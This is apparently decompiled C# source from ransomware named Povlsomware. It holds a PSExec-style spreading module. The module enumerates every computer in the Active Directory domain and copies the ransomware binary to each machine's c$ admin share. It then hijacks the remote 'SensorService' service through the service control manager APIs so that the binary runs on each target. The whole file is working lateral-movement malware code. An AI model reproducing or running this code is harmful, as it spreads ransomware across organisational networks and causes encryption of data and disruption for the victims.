using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Runtime.InteropServices;

namespace TekstTV;

internal class PSExec
{
	[DllImport("advapi32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr OpenSCManagerW(string machineName, string databaseName, uint dwAccess);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ChangeServiceConfig(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

	[DllImport("advapi32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

	public static List<string> FindTargets()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		List<string> list = new List<string>();
		string text = "";
		string machineName = Environment.MachineName;
		Console.WriteLine(machineName);
		try
		{
			text = Environment.UserDomainName;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Please run as a domain user" + ex.Message);
		}
		DirectorySearcher val = new DirectorySearcher(new DirectoryEntry("LDAP://" + text));
		val.set_Filter("(objectClass=computer)");
		foreach (SearchResult item in val.FindAll())
		{
			string text2 = item.GetDirectoryEntry().get_Name().ToString()
				.Substring(3);
			if (text2 != machineName)
			{
				list.Add(text2);
				Console.WriteLine("We can attack: " + text2);
			}
		}
		return list;
	}

	public static void RunMe()
	{
		string text = "";
		try
		{
			text = Environment.UserDomainName;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Please run as a domain user" + ex.Message);
		}
		if (text.Length <= 0)
		{
			return;
		}
		List<string> list = FindTargets();
		if (list.Count <= 0)
		{
			return;
		}
		string text2 = "C:\\Povlsomware.exe";
		if (!File.Exists(text2))
		{
			return;
		}
		foreach (string item in list)
		{
			string destFileName = "\\\\" + item + "\\c$\\\\Windows\\system32\\tasks\\Povlsomware.exe";
			try
			{
				File.Copy(text2, destFileName, overwrite: true);
			}
			catch (Exception ex2)
			{
				Console.WriteLine("copy " + ex2.Message);
			}
			IntPtr hSCManager = OpenSCManagerW(item, null, 983103u);
			string lpServiceName = "SensorService";
			IntPtr hService = OpenService(hSCManager, lpServiceName, 983551u);
			string lpBinaryPathName = "C:\\Windows\\system32\\tasks\\Povlsomware.exe";
			ChangeServiceConfig(hService, uint.MaxValue, 3, 0, lpBinaryPathName, null, null, null, null, null, null);
			StartService(hService, 0, null);
		}
	}
}
